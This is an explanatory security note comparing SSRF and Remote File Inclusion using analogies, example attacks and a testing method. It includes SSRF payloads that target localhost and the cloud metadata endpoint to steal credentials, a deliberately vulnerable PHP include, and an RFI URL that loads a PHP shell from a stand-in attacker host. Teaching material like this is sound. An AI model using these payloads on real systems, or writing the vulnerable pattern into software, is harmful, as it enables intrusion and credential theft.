# SSRF vs RFI

## 1. The Simple Difference 

* **SSRF (Server-Side Request Forgery):** You trick the server into **visiting** a URL.
    * *Analogy:* You ask a security guard to go check a room you aren't allowed in and tell you what is inside. The guard just *looks*.
* **RFI (Remote File Inclusion):** You trick the server into **downloading and running** a script from a URL.
    * *Analogy:* You hand the security guard a piece of paper with instructions written on it. The guard reads it and *follows the instructions* (e.g., "Open the safe").

> [!NOTE] Key Takeaway
> **SSRF** = "Go fetch data from there."
> **RFI** = "Go fetch code from there AND execute it as part of your own code."

---

## 2. SSRF (Server-Side Request Forgery)

**Concept:** The attacker abuses a feature where the server fetches a resource (like an image, a webhook, or a PDF). The attacker changes the target to something internal that they shouldn't be able to access.

**Goal:** Access internal networks, scan ports, or read cloud metadata.

### Simple Examples of SSRF

#### Example A: The "Image Fetcher" (Scanning Internal Network)
**Normal Scenario:**
User enters: `https://google.com/logo.png`
Server says: "Okay, I will go to google.com, get the image, and show it to you."

**Attack Scenario (SSRF):**
User enters: `http://127.0.0.1:8080/admin`
Server says: "Okay, I will go to *myself* (localhost) at port 8080... Oh, here is the admin panel login page!"
*Result:* Attacker sees the internal admin panel.

#### Example B: The "Cloud Metadata" Theft
**Attack Scenario:**
User enters: `http://169.254.169.254/latest/meta-data/`
Server says: "Okay, visiting that IP..."
*Result:* The server returns its own AWS cloud credentials (keys/secrets) to the attacker.

---

## 3. RFI (Remote File Inclusion)

**Concept:** The application is written in a way that it "includes" other files to run. If the developer is careless (and `allow_url_include` is ON in PHP), the attacker can replace a legitimate filename with a URL to a malicious script hosted on the attacker's server.

**Goal:** Remote Code Execution (RCE). Taking full control of the server immediately.

### Simple Examples of RFI

#### Example A: The Malicious PHP Shell
**Vulnerable Code (PHP):**
```php
// The developer expects ?page=contact.php
include($_GET['page']);

```

**Normal Scenario:** User requests: `website.com/index.php?page=about-us.php` Server: "I will grab the code from `about-us.php` and run it here."

**Attack Scenario (RFI):** User requests: `website.com/index.php?page=http://evil-hacker.com/shell.txt` _(Note: shell.txt contains PHP code like `<?php system('whoami'); ?>`)_

Server: "I will go to `evil-hacker.com`, grab `shell.txt`, and **RUN** the code inside it." _Result:_ The server executes the attacker's code. The attacker now owns the server.

## 4. Side-by-Side Comparison

| Feature         | SSRF (Server-Side Request Forgery)                      | RFI (Remote File Inclusion)                                        |
| --------------- | ------------------------------------------------------- | ------------------------------------------------------------------ |
| **The Action**  | **Visiting/Fetching** a URL.                            | **Executing/Running** code from a URL.                             |
| **Main Target** | Internal IPs, Cloud Metadata, Internal Ports.           | The Application Logic itself.                                      |
| **Result**      | Information Leak, Port Scanning.                        | **Remote Code Execution (RCE)**.                                   |
| **Language**    | Can happen in ANY language (Python, Java, NodeJS, PHP). | Mostly specific to **PHP** (requires `include/require` functions). |
| **Defense**     | Whitelist domains, block internal IP ranges.            | Disable `allow_url_include` in `php.ini`.                          |
## 5. How to Test (Practical Identification)

How do you know which one you found?

1. **Setup:** Start a listener on your own server (e.g., using Netcat or Burp Collaborator).
    
2. **Inject:** Send the URL of your listener to the vulnerable parameter.
    
3. **Observe the connection:**
    

- **It is SSRF if:**
    
    - You see a request like `GET / HTTP/1.1`.
        
    - The server just "touched" your listener.
        
    - Nothing else happened.
        
- **It is RFI if:**
    
    - You hosted a file with code (e.g., `print("TEST");`).
        
    - You see the word "TEST" appear **on the victim's website**.
        
    - This means the server didn't just fetch the file; it actually **processed/executed** the content.